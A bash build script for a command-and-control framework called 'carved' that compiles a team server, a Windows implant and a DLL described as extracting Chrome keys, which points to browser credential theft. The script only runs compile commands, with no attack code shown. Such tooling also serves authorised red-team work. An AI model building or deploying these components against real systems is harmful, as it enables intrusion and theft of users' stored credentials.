#!/bin/bash
set -e

echo "[*] building carved C2 framework..."

mkdir -p build/payloads

echo "[*] Building gobound.dll..."
cd gobound/dll
GOOS=windows GOARCH=amd64 CGO_ENABLED=1 go build -buildmode=c-shared -ldflags="-s -w" -trimpath -o ../../build/payloads/gobound.dll
cd ../..

echo "[*] building server..."
cd server/cmd
GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -trimpath -o ../../build/server
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -trimpath -o ../../build/server.exe
cd ../..

echo "[*] building implant..."
cd implant/cmd
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -trimpath -o ../../build/implant.exe
cd ../..

echo "[+] build complete!"
echo "    build/server(.exe)              - linux / windows team server"
echo "    build/implant.exe         - windows implant"
echo "    build/payloads/gobound.dll - chrome key extraction DLL"
